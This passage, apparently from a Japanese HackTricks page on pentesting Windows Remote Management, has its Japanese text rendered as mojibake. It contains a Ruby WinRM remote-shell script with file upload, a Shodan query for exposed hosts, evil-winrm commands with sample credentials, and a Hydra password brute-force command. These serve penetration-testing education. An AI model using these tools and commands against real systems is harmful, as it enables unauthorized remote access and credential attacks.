require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## å‚è€ƒæ–‡çŒ®

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks è‡ªå‹•ã‚³ãƒãƒ³ãƒ‰
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°å ±é…¬ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
